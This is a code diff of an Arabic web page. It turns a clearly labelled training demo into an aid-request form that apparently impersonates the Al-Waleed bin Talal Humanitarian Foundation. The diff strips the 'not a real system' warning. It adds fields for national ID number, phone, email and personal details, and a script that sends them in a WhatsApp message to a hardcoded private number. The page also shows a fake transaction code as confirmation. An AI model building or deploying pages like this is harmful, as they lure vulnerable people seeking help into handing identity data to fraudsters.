@@ -4,9 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>نظام متابعة المعاملات - تجريبي</title>
+<title>نظام طلب المساعدة - 
 
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 
 <style>
 
@@ -18,109 +18,130 @@
 body{
     margin:0;
     background:#f5f7f6;
-    color:#333;
+    direction:rtl;
 }
 
 
-/* تنبيه تجريبي */
-.demo-alert{
-    background:#fff3cd;
-    color:#856404;
+/* شريط تجريبي */
+.demo-bar{
+    background:#006400;
+    color:white;
     text-align:center;
-    padding:12px;
-    font-weight:bold;
-    border-bottom:1px solid #ffeeba;
+    padding:10px;
     font-size:14px;
+    font-weight:bold;
 }
 
 
 /* الهيدر */
 .header{
-    background:#008444;
-    color:white;
+    background:white;
     padding:20px;
     text-align:center;
+    box-shadow:0 3px 15px rgba(0,0,0,.08);
 }
 
 .header h1{
+    color:#008444;
     margin:0;
     font-size:24px;
 }
 
 
-/* الحاوية */
+/* صندوق النموذج */
 .container{
 
-    width:90%;
-    max-width:500px;
+    width:95%;
+    max-width:520px;
     margin:30px auto;
-    background:white;
-    padding:25px;
-    border-radius:18px;
-    box-shadow:0 8px 25px rgba(0,0,0,.1);
 
 }
 
 
-/* العناوين */
+.card{
 
-.title{
+    background:white;
+    padding:25px;
+    border-radius:20px;
+    box-shadow:0 10px 30px rgba(0,0,0,.12);
+
+}
+
+
+.card h2{
+
     text-align:center;
     color:#008444;
-    font-size:22px;
-    font-weight:800;
+    margin-bottom:10px;
+
+}
+
+
+.note{
+
+    text-align:center;
+    color:#777;
+    font-size:14px;
     margin-bottom:25px;
+
 }
 
 
 /* الحقول */
 
-.input-group{
-    margin-bottom:18px;
+.group{
+
+    margin-bottom:15px;
+
 }
 
 
-.input-group label{
+.group label{
 
     display:block;
     margin-bottom:7px;
     font-weight:bold;
-    color:#444;
+    color:#333;
 
 }
 
 
-.input-group input{
+.group input,
+.group select,
+.group textarea{
 
     width:100%;
-    padding:14px;
+    padding:13px;
     border:1px solid #ddd;
     border-radius:12px;
     outline:none;
-    font-size:16px;
-    text-align:right;
+    font-size:15px;
+    background:#fafafa;
 
 }
 
 
-.input-group input:focus{
+.group input:focus,
+.group select:focus,
+.group textarea:focus{
 
     border-color:#008444;
+    background:white;
 
 }
 
 
 
-/* زر */
+/* زر واتساب */
 
-.main-btn{
+.whatsapp-btn{
 
     width:100%;
     padding:15px;
-    background:#008444;
-    color:white;
     border:none;
     border-radius:30px;
+    background:#25D366;
+    color:white;
     font-size:17px;
     font-weight:bold;
     cursor:pointer;
@@ -129,24 +150,60 @@ body{
 }
 
 
-.main-btn:hover{
+.whatsapp-btn:hover{
 
-    background:#006d38;
+    opacity:.9;
+
+}
+
+
+/* زر ارسال عادي */
+
+.submit-btn{
+
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:30px;
+    background:#008444;
+    color:white;
+    font-size:17px;
+    font-weight:bold;
+    cursor:pointer;
+    margin-top:10px;
 
 }
 
 
 
-/* صندوق النتيجة */
+/* إشعار النسخ */
 
-.result-box{
+.toast{
+
+    position:fixed;
+    top:20px;
+    right:50%;
+    transform:translateX(50%);
+    background:#008444;
+    color:white;
+    padding:12px 25px;
+    border-radius:30px;
+    display:none;
+    z-index:9999;
+    box-shadow:0 5px 20px rgba(0,0,0,.2);
+
+}
+
+
+/* صفحة التأكيد */
+
+.confirm-box{
 
     display:none;
-    margin-top:25px;
-    background:#f8fff9;
-    border:1px solid #b7e4c7;
-    border-radius:15px;
-    padding:20px;
+    background:white;
+    padding:25px;
+    border-radius:20px;
+    box-shadow:0 10px 30px rgba(0,0,0,.15);
     text-align:center;
 
 }
@@ -154,429 +211,377 @@ body{
 
 .code-box{
 
-    background:white;
+    background:#f1f8f3;
     border:2px dashed #008444;
-    border-radius:12px;
     padding:15px;
     font-size:28px;
-    font-weight:800;
+    font-weight:bold;
     color:#008444;
-    letter-spacing:3px;
-    margin:15px 0;
+    border-radius:15px;
+    margin:20px 0;
 
 }
 
-
-
-/* زر النسخ */
 
 .copy-btn{
 
     background:#008444;
     color:white;
     border:none;
-    padding:12px 30px;
+    padding:13px 30px;
     border-radius:25px;
-    font-size:16px;
     font-weight:bold;
     cursor:pointer;
 
 }
 
 
-.copy-btn:active{
-
-    transform:scale(.96);
-
-}
-
-
-.footer-note{
-
-    text-align:center;
-    color:#777;
-    font-size:13px;
-    margin-top:20px;
-
-}
-
-
 </style>
-
 </head>
-
 <body>
 
 
-<div class="demo-alert">
-
-⚠️ موقع تجريبي للتدريب والمحاكاة فقط - ليس نظاماً مالياً حقيقياً
-
+<div class="demo-bar">
+ مؤسسة الوليد بن طلال الإنسانية فقط
 </div>
 
 
 <div class="header">
-
 <h1>
-نظام متابعة المعاملات
+نظام طلب المساعدة
 </h1>
-
 </div>
 
 
 <div class="container">
 
-<h2 class="title">
-بيانات المستفيد
-</h2>
+<div class="card" id="requestCard">
+
+<h2>تقديم طلب مساعدة</h2>
+
+<p class="note">
+يرجى تعبئة البيانات التالية لإرسال الطلب
+</p>
 
 
-<div class="input-group">
+<div class="group">
+<label>الاسم الكامل</label>
+<input id="name" type="text" placeholder="اكتب الاسم الكامل">
+</div>
 
-<label>
-الاسم الكامل
-</label>
 
-<input type="text" id="name" placeholder="اكتب الاسم">
+
+<div class="group">
+<label>رقم الجوال</label>
+<input id="phone" type="tel" placeholder="اكتب رقم الجوال">
+</div>
+
+
+
+<div class="group">
+<label>رقم الهوية</label>
+<input id="idNumber" type="text" placeholder="اكتب رقم الهوية">
+</div>
+
+
+
+<div class="group">
+<label>البريد الإلكتروني</label>
+<input id="email" type="email" placeholder="example@email.com">
+</div>
+
+
+
+<div class="group">
+<label>نوع المساعدة</label>
+
+<select id="helpType">
+
+<option value="">
+اختر نوع المساعدة
+</option>
+
+<option>
+مساعدة مالية
+</option>
+
+<option>
+مساعدة سكنية
+</option>
+
+<option>
+مساعدة علاجية
+</option>
+
+<option>
+مساعدة تعليمية
+</option>
+
+<option>
+أخرى
+</option>
+
+</select>
 
 </div>
 
 
-<div class="input-group">
+
+
+<div class="group">
 
 <label>
-رقم الهوية
+تفاصيل الطلب
 </label>
 
-<input type="text" id="idNumber" placeholder="اكتب رقم الهوية">
+<textarea 
+id="details"
+rows="4"
+placeholder="اكتب تفاصيل طلبك">
+</textarea>
 
 </div>
 
 
-<div class="input-group">
 
-<label>
-رقم الجوال
-</label>
-
-<input type="tel" id="phone" placeholder="اكتب رقم الجوال">
-
-</div>
-
-
-<button class="main-btn" onclick="generateCode()">
-
-تأكيد البيانات
-
+<button class="submit-btn" onclick="sendRequest()">
+إرسال الطلب
 </button>
 
 
-<div class="result-box" id="result">
+
+<button class="whatsapp-btn" onclick="sendWhatsApp()">
+🟢 إرسال التفاصيل عبر واتساب
+</button>
 
 
-<h3>
-تم إنشاء رمز المعاملة التجريبي
-</h3>
+</div>
+
+
+
+
+<!-- صندوق التأكيد -->
+
+<div class="confirm-box" id="confirmBox">
+
+<h2 style="color:#008444">
+تم تسجيل الطلب بنجاح
+</h2>
+
+
+<p>
+رقم المعاملة الخاص بك:
+</p>
 
 
 <div class="code-box" id="transactionCode">
-
+A0000
 </div>
+
 
 
 <button class="copy-btn" onclick="copyCode()">
-
 نسخ الكود
-
 </button>
 
 
-<p class="footer-note">
-احتفظ بالرمز لاستخدامه في صفحة المتابعة التجريبية
-</p>
+</div>
+
+
 
 
 </div>
 
 
+
+<div class="toast" id="toast">
+تم النسخ بنجاح
 </div>
+
 <script>
 
 
-// إنشاء رمز معاملة تجريبي (حرف + 4 أرقام)
-function generateCode(){
+// إنشاء رقم معاملة قصير
+function createCode(){
 
-    let name = document.getElementById("name").value.trim();
-    let idNumber = document.getElementById("idNumber").value.trim();
-    let phone = document.getElementById("phone").value.trim();
+    let letter = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 
-
-    if(name === "" || idNumber === "" || phone === ""){
-
-        alert("يرجى تعبئة جميع البيانات");
-        return;
-
-    }
+    let randomLetter =
+    letter[Math.floor(Math.random()*letter.length)];
 
 
-
-    // حرف عشوائي + 4 أرقام
-    let letter = String.fromCharCode(
-        65 + Math.floor(Math.random() * 26)
-    );
+    let numbers =
+    Math.floor(1000 + Math.random()*9000);
 
 
-    let numbers = Math.floor(
-        1000 + Math.random() * 9000
-    );
+    return randomLetter + numbers;
 
-
-    let code = letter + numbers;
+}
 
 
 
-    // حفظ بيانات تجريبية داخل المتصفح
-    localStorage.setItem(
-        "demoTransaction",
-        JSON.stringify({
 
-            name:name,
-            id:idNumber,
-            phone:phone,
-            code:code
+// إرسال الطلب وعرض التأكيد
 
-        })
-    );
+function sendRequest(){
 
 
+let name =
+document.getElementById("name").value.trim();
 
-    document.getElementById("transactionCode").innerText = code;
+let phone =
+document.getElementById("phone").value.trim();
+
+let idNumber =
+document.getElementById("idNumber").value.trim();
 
 
-    document.getElementById("result").style.display="block";
+
+if(name==="" || phone==="" || idNumber===""){
+
+alert("يرجى تعبئة الاسم ورقم الجوال ورقم الهوية");
+
+return;
+
+}
+
+
+
+let code=createCode();
+
+
+document.getElementById("transactionCode").innerText=code;
+
+
+
+document.getElementById("requestCard").style.display="none";
+
+
+document.getElementById("confirmBox").style.display="block";
 
 
 }
 
 
 
-// نسخ الكود للحافظة
+
+// نسخ الكود
+
 function copyCode(){
 
-    let code =
-    document.getElementById("transactionCode").innerText;
+
+let code =
+document.getElementById("transactionCode").innerText;
 
 
-    navigator.clipboard.writeText(code)
-    .then(function(){
+navigator.clipboard.writeText(code)
+.then(()=>{
 
-        alert("تم نسخ رمز المعاملة: " + code);
 
-    })
-    .catch(function(){
+let toast =
+document.getElementById("toast");
 
-        alert("تعذر النسخ، قم بالنسخ يدوياً");
 
-    });
+toast.style.display="block";
+
+
+setTimeout(()=>{
+
+toast.style.display="none";
+
+},2000);
+
+
+
+});
 
 
 }
 
 
-</script>
-<!-- صفحة التحقق التجريبية -->
-
-<div class="container" style="margin-top:40px;">
-
-<h2 class="title">
-متابعة المعاملة
-</h2>
 
 
-<div class="input-group">
+// إرسال واتساب
 
-<label>
-رقم الهوية
-</label>
-
-<input 
-type="text" 
-id="checkId" 
-placeholder="أدخل رقم الهوية">
-
-</div>
+function sendWhatsApp(){
 
 
 
-<div class="input-group">
-
-<label>
-رمز المعاملة
-</label>
-
-<input 
-type="text" 
-id="checkCode" 
-placeholder="مثال A1234">
-
-</div>
+let name =
+document.getElementById("name").value.trim();
 
 
-
-<button class="main-btn" onclick="checkTransaction()">
-
-متابعة الحالة
-
-</button>
+let phone =
+document.getElementById("phone").value.trim();
 
 
-
-<div 
-class="result-box" 
-id="checkResult"
->
-
-</div>
+let idNumber =
+document.getElementById("idNumber").value.trim();
 
 
-</div>
+let email =
+document.getElementById("email").value.trim();
+
+
+let help =
+document.getElementById("helpType").value;
+
+
+let details =
+document.getElementById("details").value.trim();
 
 
 
-<script>
 
+if(name==="" || phone==="" || idNumber===""){
 
-function checkTransaction(){
+alert("يرجى إدخال الاسم ورقم الجوال ورقم الهوية");
 
-
-let savedData = localStorage.getItem("demoTransaction");
-
-
-let resultBox =
-document.getElementById("checkResult");
-
-
-if(!savedData){
-
-    resultBox.style.display="block";
-
-    resultBox.innerHTML =
-    `
-    <h3 style="color:#d9534f">
-    لا توجد معاملة تجريبية محفوظة
-    </h3>
-    `;
-
-    return;
+return;
 
 }
 
 
 
-let data = JSON.parse(savedData);
+
+let message =
+
+"📌 طلب تجريبي جديد\n\n"+
+
+"👤 الاسم: "+name+"\n"+
+
+"📱 الجوال: "+phone+"\n"+
+
+"🪪 الهوية: "+idNumber+"\n"+
+
+"📧 البريد: "+email+"\n"+
+
+"📂 نوع المساعدة: "+help+"\n"+
+
+"📝 التفاصيل: "+details+"\n\n"+
+
+"⚠️ نموذج تجريبي للتدريب فقط";
 
 
 
-let enteredId =
-document.getElementById("checkId").value.trim();
 
-
-let enteredCode =
-document.getElementById("checkCode").value.trim()
-.toUpperCase();
+let whatsappNumber="966580272758";
 
 
 
-if(
-enteredId === data.id &&
-enteredCode === data.code
-){
+let url=
+
+"https://wa.me/"+
+
+whatsappNumber+
+
+"?text="+
+
+encodeURIComponent(message);
 
 
-resultBox.style.display="block";
 
-
-resultBox.innerHTML =
-
-`
-
-<h3 style="color:#008444">
-
-تم التحقق بنجاح ✓
-
-</h3>
-
-
-<p>
-
-اسم المستفيد:
-<br>
-
-<b>${data.name}</b>
-
-</p>
-
-
-<p>
-
-رمز المعاملة:
-<br>
-
-<b style="color:#008444;font-size:22px">
-
-${data.code}
-
-</b>
-
-</p>
-
-
-<p>
-
-حالة الطلب:
-<br>
-
-<span style="color:#e6a700;font-weight:bold">
-
-قيد المراجعة (تجريبي)
-
-</span>
-
-</p>
-
-
-`;
-
-
-}
-
-else{
-
-
-resultBox.style.display="block";
-
-
-resultBox.innerHTML =
-
-`
-
-<h3 style="color:#d9534f">
-
-بيانات غير صحيحة
-
-</h3>
-
-
-<p>
-
-تأكد من رقم الهوية ورمز المعاملة
-
-</p>
-
-`;
-
-}
-
+window.open(url,"_blank");
 
 }
 
@@ -586,5 +591,4 @@ resultBox.innerHTML =
 
 
 </body>
-
 </html>
